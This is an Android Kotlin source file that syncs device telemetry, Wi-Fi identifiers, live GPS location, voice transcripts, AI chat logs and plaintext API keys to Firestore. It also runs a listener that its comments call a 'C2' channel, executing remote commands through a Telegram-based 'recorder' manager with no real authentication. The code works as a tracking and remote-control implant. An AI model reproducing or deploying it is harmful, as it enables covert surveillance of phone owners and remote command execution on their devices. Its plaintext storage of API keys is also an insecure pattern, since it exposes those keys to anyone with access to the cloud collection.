package com.example.core.cloud

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.util.Log
import com.example.core.telemetry.DeviceInfoProvider
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.LinkedHashSet
import java.util.Locale
import java.util.TimeZone

data class GroundingContext(
    val steps_at_time: Int = 0,
    val active_location: String = ""
)

data class FirestoreChatMessage(
    val id: String = "",
    val sender: String = "USER", // "USER" or "AI"
    val content: String = "",
    val grounding_context: Map<String, Any>? = null,
    val timestamp: String = ""
)

data class FirestoreVoiceNote(
    val id: String = "",
    val raw_transcript: String = "",
    val category: String = "TASK",
    val urgency: String = "HIGH",
    val parsed_title: String = "",
    val ai_summary: String = "",
    val completed: Boolean = false,
    val source: String = "TELEGRAM_VOICE",
    val created_at: String = ""
)

class FirestoreSyncManager private constructor(private val context: Context) {

    private val firestore: FirebaseFirestore by lazy {
        FirebaseFirestore.getInstance()
    }

    private var remoteCommandsListener: ListenerRegistration? = null
    private val processedCommandDocIds = Collections.synchronizedSet(LinkedHashSet<String>())
    private val syncScope = CoroutineScope(Dispatchers.IO)

    private fun getCurrentIsoTimestamp(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date())
    }

    // 1. `telemetry/current` (Real-Time Device State from Real Hardware Sensors)
    fun syncRealTelemetryFromHardware(
        stepCountToday: Int,
        screenOnMinutesToday: Int
    ) {
        try {
            val deviceInfo = DeviceInfoProvider(context)
            val deviceId = deviceInfo.getOrGenerateDeviceUuid()

            // Real Battery & Thermal Telemetry
            val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryIntent = context.registerReceiver(null, batteryFilter)
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryLevel = if (level >= 0 && scale > 0) (level * 100 / scale) else 100
            val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            val rawTemp = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
            val batteryTempCelsius = if (rawTemp > 0) rawTemp / 10.0 else 31.5
            val cpuTempCelsius = batteryTempCelsius + 3.5

            // Real System RAM from ActivityManager
            val actManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager?.getMemoryInfo(memInfo)
            val ramTotalMb = if (memInfo.totalMem > 0) (memInfo.totalMem / (1024 * 1024)).toInt() else 6144
            val ramAvailMb = if (memInfo.availMem > 0) (memInfo.availMem / (1024 * 1024)).toInt() else 2048
            val ramUsedMb = (ramTotalMb - ramAvailMb).coerceAtLeast(0)

            // Real Network Telemetry
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val activeNet = connectivityManager?.activeNetwork
            val caps = connectivityManager?.getNetworkCapabilities(activeNet)

            val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
            val isCell = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
            val networkType = when {
                isWifi -> "WIFI"
                isCell -> "CELLULAR"
                else -> "OFFLINE"
            }

            val wifiInfo = if (isWifi) wifiManager?.connectionInfo else null
            val rawSsid = wifiInfo?.ssid?.replace("\"", "") ?: ""
            val wifiSsid = if (rawSsid.isNotBlank() && rawSsid != "<unknown ssid>") rawSsid else if (isWifi) "Connected Wi-Fi" else "Cellular/Offline"
            val wifiBssid = wifiInfo?.bssid ?: "02:00:00:00:00:00"
            val signalStrengthDbm = wifiInfo?.rssi ?: -55

            val telemetryData = hashMapOf(
                "device_id" to deviceId,
                "battery_level" to batteryLevel,
                "battery_charging" to isCharging,
                "battery_temp_celsius" to batteryTempCelsius,
                "step_count_today" to stepCountToday,
                "screen_on_minutes_today" to screenOnMinutesToday,
                "wifi_ssid" to wifiSsid,
                "wifi_bssid" to wifiBssid,
                "network_type" to networkType,
                "signal_strength_dbm" to signalStrengthDbm,
                "ram_used_mb" to ramUsedMb,
                "ram_total_mb" to ramTotalMb,
                "cpu_temp_celsius" to cpuTempCelsius,
                "last_updated" to getCurrentIsoTimestamp()
            )

            firestore.collection("telemetry")
                .document("current")
                .set(telemetryData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(TAG, "Real telemetry synced to Firestore for $deviceId")
                }
                .addOnFailureListener { e ->
                    Log.w(TAG, "Failed to sync telemetry", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Firestore telemetry error", e)
        }
    }

    // 2. `locations/latest` (Live GPS Fix)
    fun syncLocation(
        latitude: Double,
        longitude: Double,
        accuracyMeters: Double,
        locationLabel: String
    ) {
        try {
            val mapsUrl = "https://www.google.com/maps?q=$latitude,$longitude"
            val locationData = hashMapOf(
                "latitude" to latitude,
                "longitude" to longitude,
                "accuracy_meters" to accuracyMeters,
                "location_label" to locationLabel,
                "google_maps_url" to mapsUrl,
                "timestamp" to getCurrentIsoTimestamp()
            )

            firestore.collection("locations")
                .document("latest")
                .set(locationData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(TAG, "Real GPS Location synced to Firestore: $locationLabel")
                }
                .addOnFailureListener { e ->
                    Log.w(TAG, "Failed to sync location", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Firestore location error", e)
        }
    }

    // 3. `voice_notes/{note_id}` (AI Voice Index)
    fun saveVoiceNote(
        rawTranscript: String,
        category: String = "TASK",
        urgency: String = "HIGH",
        parsedTitle: String,
        aiSummary: String,
        completed: Boolean = false,
        source: String = "TELEGRAM_VOICE"
    ) {
        try {
            val noteId = "note_${System.currentTimeMillis()}"
            val voiceNoteData = hashMapOf(
                "raw_transcript" to rawTranscript,
                "category" to category,
                "urgency" to urgency,
                "parsed_title" to parsedTitle,
                "ai_summary" to aiSummary,
                "completed" to completed,
                "source" to source,
                "created_at" to getCurrentIsoTimestamp()
            )

            firestore.collection("voice_notes")
                .document(noteId)
                .set(voiceNoteData)
                .addOnSuccessListener {
                    Log.d(TAG, "Voice note $noteId indexed to Firestore")
                }
                .addOnFailureListener { e ->
                    Log.w(TAG, "Failed to index voice note", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Firestore voice note error", e)
        }
    }

    // 4. `ai_conversations/{chat_id}/messages/{msg_id}` (Chat to AI History)
    fun streamChatMessages(chatId: String = "default_session"): Flow<List<FirestoreChatMessage>> = callbackFlow {
        val listenerRegistration = try {
            firestore.collection("ai_conversations")
                .document(chatId)
                .collection("messages")
                .orderBy("timestamp", Query.Direction.ASCENDING)
                .addSnapshotListener { snapshot, error ->
                    if (error != null) {
                        Log.w(TAG, "Listen failed for chat messages", error)
                        return@addSnapshotListener
                    }

                    if (snapshot != null) {
                        val messages = snapshot.documents.map { doc ->
                            FirestoreChatMessage(
                                id = doc.id,
                                sender = doc.getString("sender") ?: "USER",
                                content = doc.getString("content") ?: "",
                                grounding_context = doc.get("grounding_context") as? Map<String, Any>,
                                timestamp = doc.getString("timestamp") ?: ""
                            )
                        }
                        trySend(messages)
                    }
                }
        } catch (e: Exception) {
            Log.e(TAG, "Chat listener error", e)
            null
        }

        awaitClose {
            listenerRegistration?.remove()
        }
    }

    fun sendChatMessage(
        chatId: String = "default_session",
        sender: String,
        content: String,
        stepsAtTime: Int = 0,
        activeLocation: String = "Current Location",
        onComplete: ((Boolean) -> Unit)? = null
    ) {
        try {
            val msgId = "msg_${System.currentTimeMillis()}"
            val groundingContext = hashMapOf(
                "steps_at_time" to stepsAtTime,
                "active_location" to activeLocation
            )

            val msgData = hashMapOf(
                "sender" to sender,
                "content" to content,
                "grounding_context" to groundingContext,
                "timestamp" to getCurrentIsoTimestamp()
            )

            firestore.collection("ai_conversations")
                .document(chatId)
                .collection("messages")
                .document(msgId)
                .set(msgData)
                .addOnSuccessListener {
                    Log.d(TAG, "Chat message $msgId recorded")
                    onComplete?.invoke(true)
                }
                .addOnFailureListener { e ->
                    Log.w(TAG, "Failed to send chat message", e)
                    onComplete?.invoke(false)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Send chat message error", e)
            onComplete?.invoke(false)
        }
    }

    fun syncApiKey(provider: String, apiKey: String, selectedModel: String, isActive: Boolean = true) {
        try {
            val keyData = hashMapOf(
                "provider" to provider.lowercase(),
                "api_key" to apiKey,
                "selected_model" to selectedModel,
                "is_active" to isActive,
                "updated_at" to getCurrentIsoTimestamp()
            )
            firestore.collection("api_keys")
                .document(provider.lowercase())
                .set(keyData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(TAG, "API key for $provider synced to Firestore")
                }
                .addOnFailureListener { e ->
                    Log.w(TAG, "Failed to sync API key to Firestore", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Firestore API key error", e)
        }
    }

    fun syncChatSessionMeta(sessionId: String, title: String, provider: String, model: String, messageCount: Int) {
        try {
            val sessionData = hashMapOf(
                "session_id" to sessionId,
                "title" to title,
                "provider" to provider,
                "model_used" to model,
                "message_count" to messageCount,
                "updated_at" to getCurrentIsoTimestamp()
            )
            firestore.collection("chat_sessions")
                .document(sessionId)
                .set(sessionData, SetOptions.merge())
        } catch (e: Exception) {
            Log.e(TAG, "Firestore session sync error", e)
        }
    }

    // 5. `commands` (Real-Time Two-Way C2 Remote Command Execution)
    @Synchronized
    fun startListeningForRemoteCommands() {
        if (remoteCommandsListener != null) {
            Log.d(TAG, "Remote commands listener already active")
            return
        }

        Log.d(TAG, "🟢 Starting Firestore Real-Time Remote Commands Listener...")

        try {
            remoteCommandsListener = firestore.collection("commands")
                .whereEqualTo("status", "DISPATCHED")
                .addSnapshotListener { snapshot, error ->
                    if (error != null) {
                        Log.w(TAG, "Remote commands listener error", error)
                        return@addSnapshotListener
                    }

                    if (snapshot == null || snapshot.isEmpty) {
                        return@addSnapshotListener
                    }

                    for (change in snapshot.documentChanges) {
                        if (change.type == DocumentChange.Type.ADDED || change.type == DocumentChange.Type.MODIFIED) {
                            val doc = change.document
                            val docId = doc.id

                            if (processedCommandDocIds.contains(docId)) {
                                continue
                            }

                            val status = doc.getString("status") ?: ""
                            if (status != "DISPATCHED") {
                                continue
                            }

                            // Mark as processed locally immediately to avoid duplicate triggers
                            processedCommandDocIds.add(docId)
                            if (processedCommandDocIds.size > 200) {
                                val it = processedCommandDocIds.iterator()
                                if (it.hasNext()) { it.next(); it.remove() }
                            }

                            val commandText = doc.getString("command") ?: ""
                            val chatId = doc.getString("chat_id") ?: ""
                            val timestampStr = doc.getString("timestamp") ?: ""

                            // Verify freshness (ignore commands older than 3 minutes to avoid executing stale replay)
                            val isStale = try {
                                if (timestampStr.isNotBlank()) {
                                    val cleanIso = timestampStr.substringBefore(".").substringBefore("Z")
                                    val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).apply {
                                        timeZone = TimeZone.getTimeZone("UTC")
                                    }
                                    val parsedDate = sdf.parse(cleanIso)
                                    val ageMs = System.currentTimeMillis() - (parsedDate?.time ?: System.currentTimeMillis())
                                    ageMs > 3 * 60 * 1000L
                                } else false
                            } catch (e: Exception) {
                                false
                            }

                            if (isStale) {
                                Log.w(TAG, "Skipping stale remote command $docId: $commandText ($timestampStr)")
                                doc.reference.update(
                                    mapOf(
                                        "status" to "EXPIRED",
                                        "processed_at" to getCurrentIsoTimestamp()
                                    )
                                )
                                continue
                            }

                            Log.d(TAG, "⚡ Real-Time C2 Command received from Firestore [$docId]: \"$commandText\"")

                            // Mark EXECUTING in Firestore
                            doc.reference.update(
                                mapOf(
                                    "status" to "EXECUTING",
                                    "started_at" to getCurrentIsoTimestamp()
                                )
                            )

                            // Execute on TelegramC2Manager
                            syncScope.launch {
                                try {
                                    val c2Manager = com.example.core.recorder.TelegramC2Manager.getInstance(context)
                                    val targetChat = if (chatId.isNotBlank()) chatId else com.example.core.recorder.TelegramConfigManager.getInstance(context).getChatId()

                                    c2Manager.executeCommand(
                                        commandText = commandText,
                                        chatId = targetChat
                                    )

                                    // Mark completed in Firestore
                                    doc.reference.update(
                                        mapOf(
                                            "status" to "EXECUTED",
                                            "completed_at" to getCurrentIsoTimestamp(),
                                            "device_id" to com.example.core.telemetry.DeviceInfoProvider.getInstance(context).getOrGenerateDeviceUuid()
                                        )
                                    )
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed executing command $commandText", e)
                                    doc.reference.update(
                                        mapOf(
                                            "status" to "FAILED",
                                            "error" to (e.message ?: "Unknown error"),
                                            "failed_at" to getCurrentIsoTimestamp()
                                        )
                                    )
                                }
                            }
                        }
                    }
                }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to attach remote commands listener", e)
        }
    }

    @Synchronized
    fun stopListeningForRemoteCommands() {
        remoteCommandsListener?.remove()
        remoteCommandsListener = null
        Log.d(TAG, "🔴 Firestore Remote Commands Listener stopped")
    }

    companion object {
        private const val TAG = "FirestoreSyncManager"

        @Volatile
        private var instance: FirestoreSyncManager? = null

        fun getInstance(context: Context): FirestoreSyncManager {
            return instance ?: synchronized(this) {
                instance ?: FirestoreSyncManager(context.applicationContext).also { instance = it }
            }
        }
    }
}
